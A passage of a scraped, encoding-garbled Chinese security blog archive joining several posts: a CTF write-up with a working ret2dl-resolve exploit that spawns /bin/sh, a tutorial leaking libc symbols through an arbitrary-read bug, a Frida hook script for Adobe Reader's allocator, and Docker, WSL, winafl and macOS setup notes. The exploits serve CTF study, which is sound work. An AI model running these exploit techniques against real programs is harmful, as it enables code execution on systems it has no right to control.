æš‚æ—¶æ²¡ææ¸…æ¥šï¼Œå…ˆåŠ ä¸Šå¯¹é½åœ¨è¯´ã€‚ æœ€ç»ˆexpå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 36 # 0x80495e4reloc_offset = fake_reloc_addr - rel_plt_addr # 0x1374# fake dynsym herefake_dynsym_addr = base_addr + 60align_dynsym = 0x10 - ((fake_dynsym_addr-dynsym_addr) &amp; 0xF)fake_dynsym_addr += align_dynsym# const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];r_info = ((fake_dynsym_addr - dynsym_addr)/0x10)&lt;&lt; 8 | 0x7# fake dynstr herefake_dynstr_addr = base_addr + 45 # 0x80495edst_name = fake_dynstr_addr - dynstr_addr # 0x13f1#bin_sh_addr = base_addr + 76 # 0x804960c'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])#payload += \"AAAA\"#payload += \";cat ./flag\\x00\"payload += \";/bin/sh\\x00\"payload += \"\\x90\" * (36 - len(payload))print \"$1 --&gt; %d\" % (len(payload))payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"\\x90\"*(45 - len(payload)) # fake_dynstr_addr string: \"system\\x00\" herepayload += \"system\\x00\"print \"$2 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (60 - len(payload))payload += \"\\x90\" * align_dynsympayload += l32(st_name) # fake_dynsym_addrpayload += l32(0)payload += l32(0)payload += l32(0x12)print \"$3 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (80 - len(payload))io.writeline(payload)io.interact() è¯»æ–‡ä»¶çš„expæ•ˆæœ èµ·shellçš„æ•ˆæœ 0x03:å‚è€ƒ 9kå¸ˆå‚…çš„exp bigtangå¸ˆå‚…dropsçš„æ–‡ç«  ELFå¦‚ä½•æ‘§æ¯åœ£è¯ â€”â€”é€šè¿‡ELFåŠ¨æ€è£…è½½æœºåˆ¶è¿›è¡Œæ¼æ´åˆ©ç”¨ Phrackæ–‡ç« ","link":"/2016/10/25/yocto-writeup/"},{"title":"ä¸€äº›ç¯å¢ƒé…ç½®é‡åˆ°çš„å‘(æŒç»­æ›´æ–°)","text":"ä¸»è¦æ˜¯é’ˆå¯¹ä¸€äº›ç¯å¢ƒé…ç½®çš„å°é—®é¢˜çš„è®°å½• 1. å¯ç”¨äº†win10 çš„linuxå­ç³»ç»Ÿåï¼Œä¿®æ”¹é»˜è®¤ç»ˆç«¯ä¸ºzshæŒ‰ç…§ä»¥å¾€çš„å¥—è·¯ï¼Œä½¿ç”¨chsh -s /bin/zshæˆ–è€…ç›´æ¥ä¿®æ”¹/etc/passwordé‡Œçš„é…ç½®éƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•å¯¹win10çš„linuxå­ç³»ç»Ÿå¹¶ä¸ç”Ÿæ•ˆï¼Œé‡å¯ä¹‹åè¿˜æ˜¯é»˜è®¤çš„bashã€‚â€‹ è§£å†³åŠæ³•: åœ¨~/.bashrcä¸­æ·»åŠ å¦‚ä¸‹ä»£ç  123if [ -t 1 ];thenexec zshfi å°±å¯ä»¥å•¦~ 2. ubuntu16.04å®‰è£…dockeré‡åˆ°é—®é¢˜è§£å†³åŠæ³•: åœ¨/etc/apt/sources.listæ–‡ä»¶ä¸­æ·»åŠ  1deb http://cz.archive.ubuntu.com/ubuntu trusty main ç„¶å 12$ sudo apt-get install libsystemd-journal0$ sudo apt-get install docker-engine 3. ä½¿ç”¨dockeræ¥é…ç½®pwnæœåŠ¡ç¯å¢ƒè¯´æ˜ ubuntu 16.04 LTS æ–‡ä»¶ç›®å½• Dockerfile source.list start.sh 1234567891011121314151617181920212223242526272829#muhe docker study! FROM ubuntu:14.04 MAINTAINER muhe &lt;o0xmuhe@gmail.com&gt; COPY ./sources.list /etc/apt/sources.listRUN apt-get update RUN apt-get -y dist-upgradeRUN apt-get install -y socat RUN useradd -m ctfCOPY ./bin/ /home/ctf/COPY ./start.sh /start.shRUN chmod +x /start.shRUN chown -R root:ctf /home/ctfRUN chmod -R 750 /home/ctfRUN chmod 740 /home/ctf/flagRUN cp -R /lib* /home/ctfRUN cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/binRUN cp /bin/sh /home/ctf/binRUN cp /bin/ls /home/ctf/binRUN cp /bin/cat /home/ctf/binWORKDIR /home/ctfCMD [\"/start.sh\"]EXPOSE 10001 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse 123#!/bin/bashsocat TCP4-LISTEN:10001,reuseaddr,fork EXEC:/home/ctf/helloworld æœ€åä½¿ç”¨docker build -t ubuntu/pwn .æ¥æ„å»ºé•œåƒå°±å¯ä»¥äº†ã€‚ 4. åœ¨win10å­ç³»ç»Ÿä¸Šä½¿ç”¨pwntoolswin10å­ç³»ç»Ÿ+cmderé…ç½®å¥½äº†ä¹‹åçœå¾—å¼€è™šæ‹Ÿæœºäº†â€¦ç”¨æ¥æpwnä¹Ÿå¾ˆçˆ½ã€‚ä»Šå¤©å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œpwntoolsç”¨processå¯åŠ¨ç¨‹åºçš„æ—¶å€™ï¼Œé‡åˆ°å¦‚ä¸‹é—®é¢˜ï¼š 1234567891011$ python exp.pyTraceback (most recent call last): File \"exp.py\", line 9, in &lt;module&gt; p = process('./jmper') File \"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py\", line 269, in __init__ stdin, stdout, stderr, master, slave = self._handles(*handles) File \"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py\", line 605, in _handles tty.setraw(master) File \"/usr/lib/python2.7/tty.py\", line 28, in setraw tcsetattr(fd, when, mode)termios.error: (22, 'Invalid argument') è§£å†³åŠæ³•ï¼š 12#p = process('./jmper')p = process('./jmper',raw=False) 4. gdb+qemuè°ƒè¯•linuxå†…æ ¸timeout1target remote localhost:1234 æ¢æˆ 1target remote :1234 5. keyutils çš„ä¾èµ–(ubuntu)12apt-cache policy libkeyutils-devsudo apt-get install libkeyutils-dev","link":"/2016/09/24/%E4%B8%80%E4%BA%9B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"title":"ä»£ç å®¡è®¡åŸ¹å…»è®¡åˆ’","text":"0x00 : ä¸ºä»€ä¹ˆè¦æè¿™ä¸ªå› ä¸ºæˆ‘èœå•Šï¼Œè€Œä¸”æˆ‘æƒ³å­¦ä»£ç å®¡è®¡å•Šã€‚ 0x01 : ç¬¬ä¸€æ­¥å…ˆæ‰¾ç‚¹ä»£ç æ¥è¯»ä¸€è¯»ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼ŒåŸ¹å…»ä¸‹ä»£ç é˜…è¯»èƒ½åŠ›å•¥çš„ã€‚ è„šæœ¬å¼•æ“ tiny js just a demo0 https://github.com/gfwilliams/tiny-js.git jerryscript ECMS 5.1 https://github.com/jerryscript-project/jerryscript.git Espruino (MPL v2.0) ç»™åµŒå…¥å¼è®¾å¤‡ç”¨çš„ï¼Œå¾ˆå° MuJS (Affero GPL) å¾ˆå° demoç±»å‹ quad-wheel (MIT License) v7 (GPL v2.0) å‡†å¤‡å…ˆçœ‹tiny jsï¼Œä»æœ€å°çš„å¼€å§‹ï¼Œåé¢çœ‹ä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„ 2 æˆ–è€…3 è¿™æ ·çš„ã€‚ æ–‡ä»¶æ ¼å¼ç±»ä¸€äº›å°å‹çš„æ ¼å¼è§£æåº“ã€è½¯ä»¶ Xml : tinyXML / rapidxml PDF : mupdf / pdfium 0x02 : å·²è¯» tiny-js å°±æ˜¯ä¸ªdemo js engineï¼Œæ”¯æŒçš„ä¸œè¥¿ä¹Ÿå¾ˆåŸºæœ¬ï¼Œå°±æ˜¯è§£æåˆ°tokenåºåˆ—ï¼Œç„¶å case TOKENï¼Œç„¶åèµ°ä¸åŒçš„æ‰§è¡Œæµï¼Œæ‰§è¡Œjs codeã€‚","link":"/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/"},{"title":"what DynELF does basically","text":"0x00:ä¸€ç›´å¾ˆå¥½å¥‡DynELFæ˜¯æ€ä¹ˆå»info leakçš„ï¼Œåœ¨é˜…è¯»å®Œäº†è€å¤–çš„ä¸€ç¯‡æ–‡ç« åï¼Œè‡ªå·±ä¹Ÿä»¿ç…§è¿™å†™äº†ä¸€ä¸ªï¼Œé¡ºä¾¿å¤ä¹ äº†ä¸‹elfæ–‡ä»¶ç»“æ„ç›¸å…³çš„çŸ¥è¯†ã€‚ 0x01: Get elf base addrå‰æï¼šå‡è®¾ç°åœ¨å·²ç»æœ‰ä¸€ä¸ªä»»æ„åœ°å€è¯»çš„æ¼æ´ï¼Œå¯ä»¥å†™å‡ºä¸€ä¸ªleakå‡½æ•°ä¾›åé¢ä»£ç ä½¿ç”¨ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸€ä¸ªåœ°å€å¼€å§‹ï¼Œå…ˆè§£æåˆ°elf base addrã€‚ 12345678910def get_elf_base(entry): entry = u64(entry) libc_base = entry &amp; 0xfffffffffffff000 while True: tmp = leak(libc_base,0x8) if tmp[0:4] == '\\x7fELF' break libc_base -= 0x1000 print '[+]Libc base : 0x%x' % (libc_base) return libc_base 0x02: find program headerä¹‹åæ˜¯æ‰¾åˆ°ç¨‹åºå¤´ã€‚ 123456def findPhdr(addr): if bits == 32: e_phoff = u32(leak(addr+0x1c,0x4).ljust(4,'\\0')) else: e_phoff = u64(leak(addr+0x20,0x8).ljust(8,'\\0')) return e_phoff + addr 0x03: DYNAMIC Sectionæœ‰äº†ä¹‹å‰çš„ç¨‹åºå¤´ï¼Œå°±å¯ä»¥æ ¹æ®elfæ–‡ä»¶ç»“æ„ï¼Œå»æ‰¾åˆ°DYNAMIC sectionäº† 1234567def findDynamic(Phaddr,elf_base): i = -56 p_type = 0 while p_type != 2: i += 56 p_type = u32(leak,(Phaddr+i,0x4)) return u64(leak(Phaddr+i+16,0x8)) + elf_base 0x04: DT_SYMTAB and DT_STRTABæ ¹æ®ä¸Šä¸€æ­¥æ‰¾åˆ°çš„DYNAMIC sectionï¼Œå¯ä»¥ç¡®å®šDT_STRTAB å’Œ DT_SYMTABã€‚ 12345678910111213141516def findDynTable(DynamicAddr): # for DT_STRTAB -- 5 # for DT_SYMTAB -- 6 tmp_dyn = DynamicAddr dt_sym_addr = 0 dt_str_addr = 0 while True: garbage = u64(leak(tmp_dyn,0x8)) if garbage == 0x5: dt_str_addr = u64(leak(tmp_dyn+0x8,0x8)) elif garbage == 0x6: dt_sym_addr = u64(leak(tmp_dyn+0x8,0x8)) if dt_sym_addr and dt_str_addr: break tmp_dyn += 0x10 return (dt_sym_addr,dt_str_addr) 0x05: find symbol you wantæœ€åä¸€æ­¥ï¼ŒæŸ¥æ‰¾ç›®æ ‡å‡½æ•°ã€‚ 12345678910def findSymbol(strtab,symtab,symbol,elf_base): tmp_sym = symtab while True: garbage = u32(leak(tmp_sym,0x4)) name = leak(strtab+garbage,len(symbol)) if name == symbol: break tmp_sym += 0x18 symbol_addr = u64(leak(tmp_sym+0x8,0x8)) + elf_base return symbol_addr 0x06: Testæœ€åçœ‹ä¸€ä¸‹æ•ˆæœ 1234567891011121314# muhe @ ubuntu in ~/Desktop/leak_study [20:58:04] $ python leak.py [+] Starting local process './pwn200': Done[+]Libc base : 0x7f95453ef000[+]Libc Program header addr : 0x7f95453ef040[+]Dynamic addr : 0x7f95457b1ba0[+]DT_SYMTAB_Addr 0x7f95453f2d80[+]DT_STRTAB_Addr 0x7f95453ffff8[+]System addr : 0x7f9545434390[*] Switching to interactive modeWelcome to RCTFAAAAAAAAAAAAAAAAAAAAAAAA\\x9@$ [*] Got EOF while reading in interactive 0x07:å®Œæ•´ä»£ç ä¸¢åˆ°äº†è‡ªå·±çš„pwnlogå»äº†ã€‚è¯´å¥é¢˜å¤–è¯-ã€‚- åœ¨çœ‹è¿™ç¯‡Finding-Functionsçš„æ—¶å€™ï¼Œé—®äº†ä½œè€…å‡ ä¸ªé—®é¢˜ï¼Œä½œè€…éƒ½å¾ˆå¿«å›å¤è€Œä¸”è¿˜ç»™äº†ä¸å°‘å…¶ä»–çš„å»ºè®®-ã€‚- äººçœŸçš„å¾ˆniceã€‚ 0x08: ReferenceFinding-Functions","link":"/2016/12/24/what-DynELF-does-basically/"},{"title":"ä½¿ç”¨Fridaè¾…åŠ©é€†å‘","text":"0x00 : å…³äºä½¿ç”¨FridaFridaæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„ã€å¤šå¹³å°çš„hookæ¡†æ¶ï¼Œä½¿ç”¨èµ·æ¥ååˆ†æ–¹ä¾¿ï¼Œè€Œä¸”æ–‡æ¡£å…¨é¢ï¼Œå¯ä»¥å¾ˆå¥½çš„è¾…åŠ©é€†å‘å·¥ç¨‹ã€‚åœ¨éœ€è¦ä½¿ç”¨ä¸€äº›hookçš„æ—¶å€™ï¼Œå¯ä»¥å¾ˆå¿«åœ°å®Œæˆï¼›å¦‚æœè¿˜æ˜¯ç”¨c/c++çš„è¯..å†™dllï¼Œè¿˜è¦æƒ³åŠæ³•dllæ³¨å…¥ï¼Œè€Œä¸”å¾ˆéº»çƒ¦ä¸çµæ´»ï¼Œä¿®æ”¹ä»£ç å¾ˆéº»çƒ¦ã€‚ æœ€è¿‘çš„å·¥ä½œä¸­ï¼Œæˆ‘åšäº†å¾ˆå¤šé€†å‘çš„å·¥ä½œï¼Œè™½ç„¶æœ‰éƒ¨åˆ†å·¥ä½œæš‚æ—¶çœ‹ä¸åˆ°ä»€ä¹ˆæ”¶ç›Šï¼Œç®—æ˜¯ç™½æŠ˜è…¾æµªè´¹äº†ä¸¤å‘¨ï¼Œä½†æ˜¯è¿™æ®µæ—¶é—´ç†Ÿæ‚‰äº†pykdï¼Œwindbg scriptï¼Œfridaï¼ŒIDA Pythonçš„ç¼–å†™â€¦ä¹Ÿæäº†ä¸€äº›æ–¹ä¾¿æ—¥åä¿®æ”¹ä½¿ç”¨çš„æ¨¡æ¿ï¼Œç®—æ˜¯æœ‰ä¸€ç‚¹ç‚¹æ”¶è·å§ï¼Œä¸è¿‡æµªè´¹äº†æ—¶é—´è¿˜æ˜¯å¾ˆéš¾è¿‡ã€‚ 0x01 : HOOKéœ€æ±‚æˆ‘éœ€è¦å»è¿½ä¸€äº›å†…å­˜åˆ†é…ã€æœ‰äº›å¯èƒ½è¿˜éœ€è¦æ“ä½œä¸€ä¸‹ï¼Œæ–¹ä¾¿æˆ‘çš„é€†å‘å·¥ä½œé¡ºåˆ©è¿›è¡Œã€‚ æˆ‘è¿™é‡Œä»¥Adobe Reader ä¸ºä¾‹å­ï¼Œæˆ‘hookäº†readerè‡ªå·±å°è£…çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå¹¶ä¸”æ˜¾ç¤ºåˆ†é…å¾—åˆ°çš„å†…å­˜ï¼›å…¶ä»–çš„éœ€æ±‚éƒ½å·®ä¸å¤šï¼Œç›´æ¥æ”¹æ¨¡æ¿å°±è¡Œï¼Œæˆ‘æ˜¯ç”¨çš„å®˜æ–¹çš„æ¨¡æ¿ä¿®æ”¹çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from __future__ import print_functionimport fridaimport sysdef on_message(message, data): print(&quot;[%s] =&gt; %s&quot; % (message, data))def main(target_process): session = frida.attach(target_process) script = session.create_script(&quot;&quot;&quot; var baseAddr = Module.findBaseAddress('AcroRd32.dll'); console.log('AcroRd32.dll baseAddr: ' + baseAddr); var CallocFunc = resolveAddress(baseAddr); var JP2KDecodeFilterObj; var size = 1; Interceptor.attach(CallocFunc, { onEnter: function (args) { //console.log('[+] Called CallocFunc' + CallocFunc); size = args[0]; //console.log('[+] ALLOC size : ' + size); }, onLeave: function (retval) { console.log('[+] Returned from CallocFunc: ' + retval); dumpAddr('ret buffer', retval, parseInt(size)); } }); function replaceMem(addr, size){ if (addr.isNull()) return; for(var idx = 0; idx &lt; size; idx++){ Memory.writeU8(addr.add(ptr(idx)), 0x41); } } function dumpAddr(info, addr, size) { if (addr.isNull()) return; console.log('Data dump ' + info + ' :'); var buf = Memory.readByteArray(addr, size); console.log(hexdump(buf, { offset: 0, length: size, header: true, ansi: true })); } function resolveAddress(addr) { var offset = ptr(offset_you_get) var result = baseAddr.add(offset); console.log('[+] CallocFunc addr=' + result); return result; } &quot;&quot;&quot;) script.on('message', on_message) script.load() print(&quot;[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\\n\\n&quot;) sys.stdin.read() session.detach()if __name__ == '__main__': if len(sys.argv) != 2: print(&quot;Usage: %s &lt;process name or PID&gt;&quot; % __file__) sys.exit(1) try: target_process = int(sys.argv[1]) except ValueError: target_process = sys.argv[1] main(target_process) ä»£ç è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œpyè„šæœ¬ï¼Œhookéƒ¨åˆ†çš„ä»£ç æ˜¯jså†™çš„ï¼Œï¼ˆåˆè¢«é€¼ç€å­¦äº†ä¸€ä¸‹jsï¼Œç„¶è€Œæˆ‘è§‰å¾—æˆ‘çš„jså†™çš„æœ‰ç§cçš„å‘³é“â€¦ï¼‰ å¦‚æœä½ ä»”ç»†çœ‹è¢«hookçš„è¿›ç¨‹çš„è¯ï¼Œä½ ä¼šå‘ç°åœ¨hookå‘ç”Ÿåœ°æ—¶å€™ï¼ŒFridaçš„dllä¼šæ³¨å…¥è¿›å»ï¼Œç„¶åå°±æ˜¯ä¼ ç»Ÿçš„é‚£ç§hookçš„æ–¹å¼äº†ï¼Œåªæ˜¯æ¡†æ¶å¸®ä½ åšäº†å¤ªå¤šçš„äº‹æƒ…ï¼Œæ‰€ä»¥ä½ åªéœ€è¦å†™å¥½jså°±å¥½äº†ã€‚ æˆ‘æˆªå–éƒ¨åˆ†è¿è¡Œæ—¶å€™è¾“å‡ºï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505100000000 00 00 00 00 00 00 ......[+] Returned from CallocFunc: 0x348f6fb0Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 ...[+] Returned from CallocFunc: 0x32d20fd8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 .........[+] Returned from CallocFunc: 0x2c3f0f90Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 ............[+] Returned from CallocFunc: 0x1b934fc8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 .............[+] Returned from CallocFunc: 0x1bd8efb0Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 ...[+] Returned from CallocFunc: 0x35857f58Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 ..........[+] Returned from CallocFunc: 0x35b33fc8Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000030 00 .[+] Returned from CallocFunc: 0x1bd66f78Data dump ret buffer : 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000080 00 00 00 00 00 00 00 00 ........[+] Returned from CallocFunc: 0x1bd6eff8... ä¸€äº›å…¶ä»–çš„æƒ³æ³•ï¼Œè¿™ä¸ªå…¶å®å¯ä»¥åšç®€å•çš„in memory fuzzäº†ï¼Œå¾ªç¯callï¼Œç„¶åæ¢å†…å­˜â€¦å½“ç„¶è¿™ä¸ªæƒ³æ³•å¾ˆlowäº†ï¼Œnå¹´å‰çš„ä¸œè¥¿äº†ï¼Œè€Œä¸”è¿™ç§çš„è¯covå¾ˆéš¾å¤„ç†ã€‚ è¦è¯´é—®é¢˜ï¼Œå°±æ˜¯Fridaè¯»å–æœ¬åœ°æ–‡ä»¶çš„é—®é¢˜ï¼Œæˆ‘è¯•äº†new Fileå’Œfrida-fså‡ä»¥å¤±è´¥å‘Šç»ˆâ€¦å¦‚æœæœ‰äººçŸ¥é“æ€ä¹ˆç©çš„è¯ï¼Œè¿˜æœ›ä¸åèµæ•™ :) 0x02 : å…¶ä»–åœ¨å†™è¿™äº›ä¸œè¥¿çš„æ—¶å€™ï¼Œè¯·æ•™äº†jmpewså¸ˆå‚…å¾ˆå¤šé—®é¢˜ï¼Œååˆ†æ„Ÿè°¢ï¼ jmpewså¸ˆå‚…åé¢å‘æˆ‘æ¨èäº† detours + Xenosè¿™ç§æ–¹å¼æ¥åšhookï¼Œç²¾åŠ›æœ‰é™ï¼Œè€Œä¸”ä¸Šæ‰‹éš¾åº¦æœ‰ç‚¹é«˜ï¼Œæ‰€ä»¥æš‚æ—¶åªèƒ½æ”¾åœ¨to do listä¸Šäº†ï¼Œä¸è¿‡è¿˜æ˜¯å¾ˆæ„Ÿè°¢ï½","link":"/2019/01/04/%E4%BD%BF%E7%94%A8Frida%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91/"},{"title":"åˆè¯•winafl","text":"1. fuzzè‡ªå·±å†™çš„exe 2.fuzzè‡ªå·±å†™çš„dllæä¸€ä¸ªæ¥å£ç¨‹åºå»fuzzå°±å¯ä»¥äº†ï¼Œä½†æ˜¯æ•ˆç‡è´¼ä½â€¦æœ‰å¾…è§£å†³ã€‚","link":"/2016/08/26/%E5%88%9D%E8%AF%95winafl/"},{"title":"æ‹¯æ•‘macOS High sierraçš„ç¡¬ç›˜ç©ºé—´","text":"0x00 : èµ·å› Macä¸€ç›´å¼€ç€time machineå¤‡ä»½æ•°æ®ï¼Œä¸€ç›´æ²¡å‡ºå•¥é—®é¢˜ã€‚ç›´åˆ°ä»Šå¤©åœ¨å·¥ä½œçš„æ—¶å€™ï¼ŒåŸæœ¬cloneçš„ä¸€ä¸ªè™šæ‹Ÿæœºæœ‰é—®é¢˜ï¼Œæˆ‘å°±åˆ äº†ï¼Œé‡æ–°å…‹éš†ã€‚(æ²¡æœ‰å¿«ç…§çœŸçš„å°´å°¬äº†) ç»“æœå‘ç°å…‹éš†ä¸äº†ï¼Œæç¤ºæˆ‘ç¡¬ç›˜ç©ºé—´ä¸è¶³ã€‚ :(æˆ‘çœ‹äº†ä¸‹æœ¬æœºçš„ç¡¬ç›˜ï¼Œæ˜æ˜è¿˜æœ‰120g+å‘¢ï¼Œæ€ä¹ˆä¼šä¸è¶³å‘¢ã€‚ 0x01 : é—®é¢˜æ‰€åœ¨æˆ‘ä½¿ç”¨äº†clean my macå„ç§æäº‹ã€æ¸…ç†ç©ºé—´ï¼Œç£ç›˜å‰©ä½™ç©ºé—´åˆ°äº†200gã€‚ã€‚ä½†æ˜¯æˆ‘å…‹éš†è¿˜æ˜¯å¤±è´¥ :( äºæ˜¯æ‰“å¼€ç£ç›˜å·¥å…·æŸ¥çœ‹ï¼Œå‘ç°æœ‰150gç©ºé—´çš„ç©ºé—´æ˜¯å¯ä»¥æ¸…é™¤çš„ï¼Œå°±å¾ˆå¥½å¥‡å“ªæ¥çš„è¿™ä¹ˆå¤§çš„ç©ºé—´â€¦ çœ‹äº†Appleå®˜ç½‘ï¼Œè¯´æ˜¯å•¥æ–‡ä»¶å¯ä»¥å­˜iCloudï¼Œç„¶åä¸‹è½½çš„æ—¶å€™ç”¨ï¼Œå°±å¯ä»¥çœä¸‹æ¥ä¸€éƒ¨åˆ†ç©ºé—´ï¼Œå¯æ˜¯æˆ‘æƒ³äº†æƒ³ï¼Œè‚¯å®šä¸æ˜¯è¿™ä¸ªå•Šï¼Œæˆ‘iCloudä¸€å…±æ‰50gï¼Œè€Œä¸”æ‰ç”¨äº†ä¸€åŠï¼Œè¿™150gè‚¯å®šä¸å¯¹ã€‚ åæ¥åœ¨v2exçœ‹åˆ°äº†æ­£è§£ã€‚ è¿™æ˜¯å‡çº§äº†10.13åçš„time machineæçš„äº‹ï¼Œä»–æœ‰è‡ªåŠ¨æœ¬åœ°å¤‡ä»½ã€‚ 1å½“ TM æ‰“å¼€åï¼Œå¦‚æœå¤‡ä»½ä»‹è´¨ä¸å¯ç”¨ï¼Œé‚£ä¹ˆ TM ä¸ä¼šåœæ­¢å·¥ä½œï¼Œå®ƒä¾ç„¶ä¼šç›‘æ§ç³»ç»Ÿçš„è¿è¡Œï¼Œå¹¶å»ºç«‹æœ¬åœ°å¿«ç…§ï¼Œä»¥è¾¾æˆ TM çš„å¤‡ä»½åŠŸèƒ½ï¼Œæ¯”å¦‚å¦‚æœä½ åœ¨æ­¤æ—¶ä¸å°å¿ƒåˆ é™¤äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¾ç„¶å¯ä»¥ä» TM ä¸­å°†å®ƒæ¢å¤ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸é”™çš„åŠŸèƒ½ã€‚ä¸€æ—¦ä½ çš„å¤‡ä»½ä»‹è´¨å¯ç”¨ï¼Œå®ƒä¼šè‡ªåŠ¨å°†å¿«ç…§ç§»åˆ°ï¼ˆä¸æ˜¯å¤‡ä»½ï¼Œæ˜¯ç§»åŠ¨ï¼‰å¤‡ä»½ä»‹è´¨ä¸­ï¼Œä»¥é‡Šæ”¾æœ¬åœ°ç©ºé—´ï¼›è€Œä¸”å®ƒä¼šä¾ç…§å½“å‰ç³»ç»Ÿåˆ†åŒºçš„ä½¿ç”¨æƒ…å†µæ¥ç¡®è®¤è‡ªå·±å»ºç«‹æœ¬åœ°å¿«ç…§çš„è¡Œä¸ºï¼Œç®€å•è¯´å°±æ˜¯å½“æœ¬åœ°ç©ºé—²ç©ºé—´è¿‡å°‘æ—¶ï¼Œå®ƒä¼šé…Œæƒ…åˆ é™¤æ—§çš„æœ¬åœ°å¿«ç…§ã€‚ å¤§æ¦‚å°±æ˜¯è¿™æ ·çš„æƒ…å†µã€‚ 0x02 : è§£å†³1. å…³é—­æœ¬åœ°å¤‡ä»½1sudo tmutil disablelocal ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªå‘½ä»¤å·²ç»æ²¡äº†ï¼Œå¥½åƒæ˜¯è¢«ç§»é™¤äº†ã€‚ 2. åˆ é™¤æœ¬åœ°å¤‡ä»½åªèƒ½å…ˆç”¨tmutil listlocalsnapshots [mount]æ‰¾æœ¬åœ°å¤‡ä»½ï¼Œç„¶åä½¿ç”¨ tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS æ¥åˆ 